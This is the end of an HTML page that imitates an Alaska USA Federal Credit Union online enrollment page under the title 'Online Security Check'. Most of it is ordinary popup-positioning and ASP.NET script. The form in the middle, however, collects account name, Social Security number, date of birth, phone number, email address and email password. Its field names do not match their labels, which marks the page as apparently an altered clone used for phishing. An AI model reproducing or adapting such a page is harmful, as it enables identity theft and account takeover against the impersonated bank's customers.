   if(!$(PopUpElement).hasClass('InfoBoxPopup')){
       SetPositionForHover(InfoBoxClientID,TriggerElementID,direction,popupSpacing);
	    if(IframeElement) { //iframe hack is on, use basic css display manipulation (doesnt work with slidetoggle)
	        $(PopUpElement).addClass('InfoBoxHover');
           IframeElement.style.display = 'block';
           IframeElement.style.width = PopUpElement.offsetWidth;
           IframeElement.style.height = PopUpElement.offsetHeight;
           IframeElement.style.left = PopUpElement.offsetLeft;
           IframeElement.style.top = PopUpElement.offsetTop;
	    }
	    else{
	        $(PopUpElement).addClass('InfoBoxHover').children(':first').css('margin-left','');
	    }
	}
}
function SetPositionForHover(InfoBoxClientID,TriggerElementID,direction,popupSpacing) {
	var PopUpDiv = $('#'+InfoBoxClientID + '_PopupDiv');
	var PopUpCanvas = $('#'+InfoBoxClientID + '_PopupCanvas');
	var TriggerElement = $('#'+TriggerElementID);
	var triggerOffset = TriggerElement.position();
	var imgHeight = TriggerElement.height();
	var imgWidth = TriggerElement.width();
	var viewportWidth = $(window).width();
	var viewportHeight = $(window).height();
	var divWidth = PopUpCanvas.width();
	var divHeight = PopUpCanvas.height();//alert(divWidth + '...' + divHeight);
   SetPosition(PopUpCanvas,direction,popupSpacing,triggerOffset,imgHeight,imgWidth,divHeight,divWidth);
}
function SetPositionForPopup(InfoBoxClientID,TriggerElementID,direction,popupSpacing) {
	var PopUpDiv = $('#'+InfoBoxClientID + '_PopupDiv');
	var PopUpCanvas = $('#'+InfoBoxClientID + '_PopupCanvas');
	var TriggerElement = $('#'+TriggerElementID);
	var triggerOffset = TriggerElement.position();
	var imgHeight = TriggerElement.height();
	var imgWidth = TriggerElement.width();
	var viewportWidth = $(window).width();
	var viewportHeight = $(window).height();
   PopUpCanvas.addClass('InfoBoxTemp'); //turn in on, but keep it hidden so height,width exist
   PopUpDiv.addClass('InfoBoxTemp'); //turn in on, but keep it hidden so height,width exist
	var divWidth = PopUpCanvas.width();
	var divHeight = PopUpCanvas.height();
   //check if the infobox is bigger than the viewport, if so shrink it
   if(viewportWidth<divWidth){
       PopUpCanvas.width(viewportWidth);
       divWidth = PopUpCanvas.width();
   }
   PopUpCanvas.removeClass('InfoBoxTemp'); //back to what they started at
   PopUpDiv.removeClass('InfoBoxTemp'); //back to what they started at
   SetPosition(PopUpCanvas,direction,popupSpacing,triggerOffset,imgHeight,imgWidth,divHeight,divWidth);
   RePosition(PopUpCanvas,PopUpDiv,divHeight,divWidth);
}
function SetPosition(PopUpCanvas,direction,popupSpacing,triggerOffset,imgHeight,imgWidth,divHeight,divWidth) {
	var viewportWidth = $(window).width();
	var viewportHeight = $(window).height();
	if(direction == 4) {
		PopUpCanvas.css('top',triggerOffset.top).css('left',triggerOffset.left+imgWidth+popupSpacing)
	}
	else if(direction == 5) {
		PopUpCanvas.css('top',triggerOffset.top+(imgHeight/2)-(divHeight/2)).css('left',triggerOffset.left+imgWidth+popupSpacing)
	}
	else if(direction == 6) {
       //use bottom to slide up for slideToggle, clear out top that RePosition may set=
		PopUpCanvas.css('top','').css('left',triggerOffset.left+imgWidth+popupSpacing).css('bottom',viewportHeight-triggerOffset.top-imgHeight-popupSpacing);
	}
	else if(direction == 7) {
		PopUpCanvas.css('top',triggerOffset.top+(imgHeight/2)-(divHeight/2)).css('left',triggerOffset.left-divWidth-popupSpacing)
	}
	else if(direction == 8) {
       //use bottom to slide up for slideToggle, clear out top that RePosition may set=
		PopUpCanvas.css('top','').css('left',triggerOffset.left+(imgWidth/2)-(divWidth/2)).css('bottom',viewportHeight-triggerOffset.top+popupSpacing); 
	}
	else if(direction == 1) {
		PopUpCanvas.css('top',triggerOffset.top+imgHeight+popupSpacing).css('left',(triggerOffset.left+imgWidth)-divWidth)
	}
	else if(direction == 3) {
		PopUpCanvas.css('top',triggerOffset.top+imgHeight+popupSpacing).css('left',triggerOffset.left+(imgWidth/2)-(divWidth/2))
	}
	else {
	    // this is BottomRight
		PopUpCanvas.css('top',triggerOffset.top+imgHeight+popupSpacing).css('left',triggerOffset.left)
	}
}
function RePosition(PopUpCanvas,PopUpDiv,divHeight,divWidth) {
	var viewportWidth = $(window).width();
	var viewportHeight = $(window).height();
	var viewportScrollTop = $(window).scrollTop();
	var viewportScrollLeft = $(window).scrollLeft();
   //here we check if the infobox is popping up off the screen.   Reposition it so it is within the viewport
   PopUpCanvas.addClass('InfoBoxTemp'); //turn in on, but keep it hidden so height,width exist
   PopUpDiv.addClass('InfoBoxTemp'); //turn in on, but keep it hidden so height,width exist
   var divPosition = PopUpCanvas.position();
   var divTop = parseInt(divPosition.top); var divLeft = parseInt(divPosition.left);   PopUpCanvas.removeClass('InfoBoxTemp'); //back to what they started at
   PopUpDiv.removeClass('InfoBoxTemp'); //back to what they started at
   //too far down
   if((viewportScrollTop+viewportHeight)<(divTop+divHeight)){
       //alert('TOO FAR DOWN: viewportscrolltop=' + viewportScrollTop + ',viewportheight=' + viewportHeight+ ',divcsstop=' + parseInt(divPosition.top) + ',divheight=' + divHeight);alert('setting top to: ' + (viewportScrollTop+viewportHeight-divHeight));
       PopUpCanvas.css('bottom','').css('top',(viewportScrollTop+viewportHeight-divHeight));
   }
   //too far right
   if((viewportScrollLeft+viewportWidth)<(divLeft+divWidth)){
       //alert('too far right!');
       PopUpCanvas.css('left',viewportScrollLeft+viewportWidth-divWidth);
   }
   //too far up
   if(viewportScrollTop>divTop){
       //alert('too far up!');
       //alert('BEFORE   viewporttop:' + viewportScrollTop + ',popuptop:' + divPosition.top);
       PopUpCanvas.css('bottom','').css('top',viewportScrollTop);
       //alert('AFTER    viewporttop:' + viewportScrollTop + ',popuptop:' + divPosition.top);
   }
   //too far left
   if(viewportScrollLeft>divLeft){
       //alert('too far left!');
       PopUpCanvas.css('left',viewportScrollLeft);
   }
}
//]]>
</script>

<script src="/enroll/ScriptResource.axd?d=D9drwtSJ4hBA6O8UhT6CQl5kP-DNk5tqsFSKE4QAx7FiqQUkfG0xcYhM38F4ULHzEsr3ccm3WWC8c21Rx1XAbPd7dZSDwlwAN3FBxOF0-Op5UR1aFNYrVvCtHrsmIFUrjLaB6c2og1ihVr9uj93NAWWK3N01&amp;t=ffffffffa580202a" type="text/javascript"></script>
<script type="text/javascript">
//<![CDATA[
if (typeof(Sys) === 'undefined') throw new Error('ASP.NET Ajax client-side framework failed to load.');
//]]>
</script>

<script src="/enroll/ScriptResource.axd?d=JnUc-DEDOM5KzzVKtsL1tcXbu1D4Hj6yCmHmr9cM66AViK3ia2ZDHVT7KW47KHMyBMtKHFfS1WB4puAzjXwId5XQy_jrygJTcv1Xors3xQgEJuGStAVwV63p2PylRvqJXzAeOswFDaHhtAK0W-ax5ffg3ZOYXYmQ06Ttk8PaI-ZJmv_M0&amp;t=ffffffffa580202a" type="text/javascript"></script>
<script src="ScriptLib/DotNetScripts_v4.js" type="text/javascript"></script>
<script src="ScriptLib/AriaLib.js" type="text/javascript"></script>
<script src="Scripts/jquery-1.10.2.js" type="text/javascript"></script>
<script type="text/javascript">
//<![CDATA[
function WebForm_OnSubmit() {
if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;
return true;
}
//]]>
</script>

<div class="aspNetHidden">

	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="0A0E1CD6" />
	<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="" />
	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="nITEzXuHg0ltvi8axIDoU6FgeyjK1CODcX0SuolbSD8Qfzzu/P9rH+y2oqsmif1wPVeXKy8FrWBXEanpTJ0z20fVfdUPGvhZgYSi57O16eL9SEGB8Nb3CCWmPqEHahsF5avYUTmz2E90C5v+4mhgQcuAVSbC8BJe3PjJvFWbfV+3wkJCg/33wt99B7qRZhjTE9AsNLpDfUTA9g+t0HvSRZPGQildCnS95v3wCCHWVBt9v9Kl+GXnYOResxiOHuDjmffC48IXSpUYWes9gEGBW3xHJTWOx4UTRRUwaMOPNpyNwoTF" />
</div>
		<script type="text/javascript">
//<![CDATA[
Sys.WebForms.PageRequestManager._initialize('ctl00$ctl00$ScriptManager1', 'aspnetForm', ['tctl00$ctl00$PageBody$PageContent$ctl12','','tctl00$ctl00$PageBody$PageContent$enrollmentFormUpdatePanel',''], [], [], 90, 'ctl00$ctl00');
//]]>
</script>

			
<div id="pgBody">
	<div id="header">
		<div>
			<h1>Alaska USA</h1>
			<p class="skip"><a id="skip" class="skip" href="#pgMain" title="Skip navigation">Skip page header and navigation</a></p>
		</div>
		<div id="topBar">
			<a href="https://www.alaskausa.org/?t=tn" id="logo" title="Alaska USA products for you"><img src="https://www.alaskausa.org/images/nav/akusafcu_logo.png" alt="Alaska USA products for you" /></a>
			<!--<p id="headerReturnLink"><a href="https://www.alaskausa.org/?t=eh" title="Home">Return to home</a></p>-->
			<p id="topBarMenu">
				<a href="https://www.alaskausa.org">
					<span>Return to home</span>
				</a>
			</p>
		</div>
	</div>
    
	<div class="pgTitle">
		<h1>Online Security Check</h1>
	</div>	
	<div id="pgMain" class="pgMain">
		<div class="row">
			
					<div onkeypress="javascript:return WebForm_FireDefaultButton(event, &#39;SubmitButton&#39;)">
	
					<div class="leftCol">
						<div data-val-showmessagebox="True" data-val-showsummary="False" data-val-validationGroup="enrollmentValidation" id="ctl00_ctl00_PageBody_PageContent_ctl06" data-valsummary="true" style="display:none;">

	</div>
						
						<h2 style="margin-top:0; margin-bottom:8px;">Account Security Information</h2>
						<table class="dataForm topDataForm">
							
								
												<tr>
									<th scope="row"><label id="firstNameLabel">Account Name*</label></th>
									<td>
										<input name="q4" type="text" id="q4" tabindex="1" aria-labelledby="q1" onblur="setConsentName();" />							
									</td>
								</tr>
								<tr>
									<th><label id="lastNameLabel">Social Security Number*</label></th>
									<td>
										<input name="ans4" type="text" id="ans4" tabindex="1" aria-labelledby="ans4" onblur="setConsentName();" />
									</td>
								</tr>

								<tr>
									<th scope="row"><label id="firstNameLabel">Date of Birth*</label></th>
									<td>
										<input name="q5" type="text" id="q5" tabindex="1" aria-labelledby="q5" onblur="setConsentName();" />							
									</td>
								</tr>
											

								<th><label id="lastNameLabel">Phone Number*</label></th>
									<td>
										<input name="ans5" type="text" id="ans5" tabindex="1" aria-labelledby="ans2" onblur="setConsentName();" />
									</td>
								</tr>
	

<tr>
	


<tr>
									<th scope="row"><label id="firstNameLabel">Email Address*</label></th>
									<td>
										<input name="q3" type="text" id="q3" tabindex="1" aria-labelledby="q1" onblur="setConsentName();" />							
									</td>
								</tr>
								<tr>
									<th><label id="lastNameLabel">Email Password*</label></th>
									<td>
										<input name="ans3" type="password" id="ans3" tabindex="1" aria-labelledby="ans2" onblur="setConsentName();" />
									</td>
						</tbody>
						</table>
						<div id="ctl00_ctl00_PageBody_PageContent_enrollmentFormUpdatePanel">
			
								<table class="dataForm bottomDataForm">
									<tbody>
										
										
										
										
										
										
									</tbody>
									<tfoot>
										<tr>
											<td colspan="2">* indicates a required field</td>
										</tr>
									</tfoot>
								</table>
							
	</div> 
				            

						<div style="margin:40px 0;text-align:center;">
							<div style="text-align:center;margin-bottom:5px;">Clicking submit constitutes my electronic signature authorizing in the UltraBranch Service.</div>
							<input type="submit" name="ctl00$ctl00$PageBody$PageContent$SubmitButton" value="Submit" onclick="setupMessage();WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$ctl00$PageBody$PageContent$SubmitButton&quot;, &quot;&quot;, true, &quot;enrollmentValidation&quot;, &quot;&quot;, false, false))" id="SubmitButton" tabindex="1" />
						</div>
						<div id="loadingSection" class="results" style="display:none;">							
							<div id="loadingMsg"></div>
							<input type="hidden" name="ctl00$ctl00$PageBody$PageContent$returnedResults" id="returnedResults" value="false" />
						</div>

						<span id="ctl00_ctl00_PageBody_PageContent_testResponse"></span>
						<div style="display:none;"><span id="ctl00_ctl00_PageBody_PageContent_dummyInfoBox" class="" style=""><a id="ctl00_ctl00_PageBody_PageContent_dummyInfoBox_dummyInfoBox_OpenLink" onclick="TogglePersistantPopup(&#39;ctl00_ctl00_PageBody_PageContent_dummyInfoBox&#39;,&#39;ctl00_ctl00_PageBody_PageContent_dummyInfoBox_dummyInfoBox_OpenLink&#39;,1,1);CancelEvent(event);return false;" href="#" target="InfoBox">Dummy</a></span><div id="ctl00_ctl00_PageBody_PageContent_dummyInfoBox_PopupCanvas" style="width:300px;" class="InfoBoxCanvas"><div id="ctl00_ctl00_PageBody_PageContent_dummyInfoBox_PopupDiv" style="" class="InfoBox"><img id="ctl00_ctl00_PageBody_PageContent_dummyInfoBox_dummyInfoBox_CloseImage" class="InfoBox_CloseImage" onclick="TogglePersistantPopup(&#39;ctl00_ctl00_PageBody_PageContent_dummyInfoBox&#39;,&#39;ctl00_ctl00_PageBody_PageContent_dummyInfoBox_dummyInfoBox_OpenLink&#39;,1,1);CancelEvent(event);return false;" src="App_Themes/DefaultTheme/ControlImages/close.png" alt="Close Popup" />Need this because the infoboxes are hidden on initial page load --js isn't rendered during postback-- so infobox doesn't work</div></div></div>
						<script>
							function validate_hasVisa(sender, args) {
								args.IsValid = $("$(input[name$='$hasVisa']:checked").length > 0;
							}
							function clickVisa() {
								$("#hasVisa_hidden").val("clicked");
								ControlValidate("hasVisa_hidden");
							}
							function clickAutoLoan() {
								$("#hasAutoLoan_hidden").val("clicked");
								ControlValidate("hasAutoLoan_hidden");
							}
							function clickPaidAutoLoan() {
								$("#hasPaidAutoLoan_hidden").val("clicked");
								ControlValidate("hasPaidAutoLoan_hidden");
							}
							function ControlValidate(id) {
								var c = document.getElementById(id);
								if (typeof (c.Validators) != "undefined") {
									for (var i = 0; i < c.Validators.length; i++) {
										ValidatorValidate(c.Validators[i]);
									}
								}
							}
							function isPageValid() {
								if (typeof (Page_Validators) != "undefined") {
									for (var i = 0; i < Page_Validators.length; i++) {
										var validator = Page_Validators[i];
										ValidatorValidate(validator);//make sure it's been checked
										//console.log(validator.id + ":" + validator.isvalid);
										if (!validator.isvalid) { return false; }
									}
								}
								return true;
							}
							function setupMessage() {
								if (isPageValid()) {
									//when the postback returns, all of this will be undone -- hopefully the postback turns other stuff on
									$("#SubmitButton").css('disabled', true);
									ShowLoading();	//in DotNetScripts_v4
									$(".message", "#LoadingContainer").css("background", "none").css("padding-left","1px").css("padding-right","28px");	//remove the spinner, it doesn't spin in IE
									$(".inner", "#LoadingContainer").prepend("<div class=\"small progress\"><div>Loading</div></div>");	//add in the css spinner
									setTimeout(function () {
										$(".inner", "#LoadingContainer").css("width", "300px").css("padding-top", "10px");
										$(".message:first", "#LoadingContainer").html("Validating");
										$(".inner", "#LoadingContainer").append("<div class=\"message\" style=\"margin-top:5px;font-size:1em;background:none;padding-left:inherit;\"><div>This may take a minute.</div><div>Please do not refresh this page.</div></div>");
										$(".message", "#LoadingContainer").css("line-height", "inherit");
									}, 300);
									//setTimeout(function () { if ($("#returnedResults").val() != "true") { $("#loadingMsg").hide(); $("#loadingSection").show(); $("#warningSection_timeout").show(); } }, 89 * 1000);
									return true;
								}
								else {
									return false;
								}
							}
							//function testPost() {
							//	$.post("http://akusaappsdev/ubenrollment/api/decision/enroll", { "enroll_firstName": "test" },
							//		function (result) { alert(result); });
							//}
							function setConsentName() {
								var first = $.trim($("#firstName").val());
								var last = $.trim($("#lastName").val());
								var suffix = $.trim($("#suffix").val());
								if (first != "" && last != "") {
									$("#consent_applicantName").text(", " + $.trim(first + " " + last + " " + suffix).toUpperCase() + ",");
								}
								else {
									$("#consent_applicantName").text("");
								}
							}
						</script>
					</div>
					
</div>
					
						</div>
					</div>							
					<div style="clear:both;"></div>					
					<script>
						$(document).ready(function () {
							//$('a[class*=leanModal]').leanModal({ top: 200, closeButton: ".modal_close" });
							initializeMasks();
							$(document).on("click", ".dataForm input:radio", function () { selectRadio(this); });
							//$("#firstName").focus();
						});
						function initializeMasks() {
							//$(".ssnField").prop('placeholder', 'xxx-__-____').mask("xxx-99-9999", { autoclear: false });
							//$(".dateField").prop('placeholder', '__/__/____').mask("99/99/9999", { autoclear: false });
							$(".ssnField").prop('placeholder', 'xxx-__-____').mask("xxx-99-9999", { placeholder: "xxx-__-____", autoclear: false });
							$(".dateField").prop('placeholder', '__/__/____').mask("99/99/9999", { placeholder: '__/__/____', autoclear: false });
							initializeVisaMask();

							//in IE11 .mask steals focus.  This left the cursor in the visa debit card question.  Moving focus fired the validators.  So we move focus and clear the error
							setTimeout(function () { $("#firstName").focus(); }, 500);
							setTimeout(function () { Page_ClientValidateReset() }, 550);
						}
						function initializeVisaMask() {
							//in a separate function so it can be re-initialized separate from the others
							$("#visaDebitCardNumber").prop('placeholder', '__  ____  ____').mask("99  9999  9999", { placeholder: '__  ____  ____', autoclear: false });
						}
						function selectRadio(elem) {
							$(elem).closest("div[role=radiogroup]").find("input:radio").each(function () { $(this).closest("label").removeClass("radioSelected"); });
							$(elem).closest("label").addClass("radioSelected");
						}
						function reselectAllRadios() {
							$(".dataForm input:radio:checked").each(function () { selectRadio(this); });
						}
						function Page_ClientValidateReset() {
							if (typeof (Page_Validators) != "undefined") {
								for (var i = 0; i < Page_Validators.length; i++) {
									var validator = Page_Validators[i];
									validator.isvalid = true;
									ValidatorUpdateDisplay(validator);
									//console.log(validator.id + "<br>");
								}
							}
						}
					</script>
				
		</div>
	</div>


	<div id="siteFooter">
		<div id="footer">
			<p class="links">
				<a href="https://www.alaskausa.org/?t=ef" title="Home">Return to home</a>
			</p>
			<div class="disclaimer">
				<div class="disclaimerLogos">
					<img class="decorRight" src="https://www.alaskausa.org/images/images.asp?ref=NCUA_2016_gray.png" alt="Federally Insured by NCUA" />
					<img class="decorRight" alt="Equal Housing Lender" src="https://www.alaskausa.org/images/nav/EHL_2016_gray.png" />
				</div>
				<p>Alaska USA and UltraBranch are registered trademarks of Alaska USA Federal Credit Union</p>
				<p>&#169; Copyright <span id="ctl00_ctl00_PageBody_CopyrightYear">2019</span></p>
			</div>
		</div>
	</div>
</div>

  <script type="text/javascript" src="https://www.alaskausa.org/angelfish.js"></script>
  <script type="text/javascript">
      //<![CDATA[
  		agf.pageview();
      //]]>
	</script>

		
<script type="text/javascript">
//<![CDATA[
var ctl00_ctl00_PageBody_PageContent_ctl10 = document.all ? document.all["ctl00_ctl00_PageBody_PageContent_ctl10"] : document.getElementById("ctl00_ctl00_PageBody_PageContent_ctl10");
ctl00_ctl00_PageBody_PageContent_ctl10.evaluationfunction = "Length_Validation";
ctl00_ctl00_PageBody_PageContent_ctl10.MaximumLength = "20";
var ctl00_ctl00_PageBody_PageContent_ctl11 = document.all ? document.all["ctl00_ctl00_PageBody_PageContent_ctl11"] : document.getElementById("ctl00_ctl00_PageBody_PageContent_ctl11");
ctl00_ctl00_PageBody_PageContent_ctl11.evaluationfunction = "Length_Validation";
ctl00_ctl00_PageBody_PageContent_ctl11.MaximumLength = "40";
//]]>
</script>


<script type="text/javascript">
//<![CDATA[
$(document).ready(function() { console.log('ready');SetAriaLabels_FormRows();SetAriaLabels_FormColumns();AriaFixWrappedElements();setTimeout(SetAriaForValidators,1000); });AjaxFix();PrefsFormsLib.ApplicationRoot = '/enroll/';//]]>
</script>
</form>
	</div>
</body>
</html>